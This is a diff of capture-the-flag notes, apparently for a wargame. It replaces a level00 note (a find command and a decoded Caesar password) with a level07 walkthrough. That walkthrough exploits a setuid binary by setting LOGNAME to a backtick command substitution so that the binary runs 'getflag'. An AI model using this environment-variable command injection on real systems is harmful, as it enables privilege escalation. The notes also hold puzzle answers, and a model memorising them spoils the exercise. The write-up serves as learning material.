@@ -1,5 +1,19 @@
-find / -user flag00 2>/dev/null
+# ls -l level07 is owned by flag07 (as always)
 
-find all file owned by user flag00, redirect bad result in /dev/null
+./level07
+> level07
+# echo program name ?
 
-Code : cdiiddwpgswtgt, brutforce cesar code, it's 15 -> "nottoohardhere"
+strings level07
+
+# We see some clue like
+getenv...?
+LOGNAME...?
+/bin/echo %s ...?
+
+# We check env, LOGNAME=level07 🧐 mmhhh
+
+# We change logname in env to getflag
+export LOGNAME=\`getflag\`
+
+# WE RUN IT, OMG THE FLAG
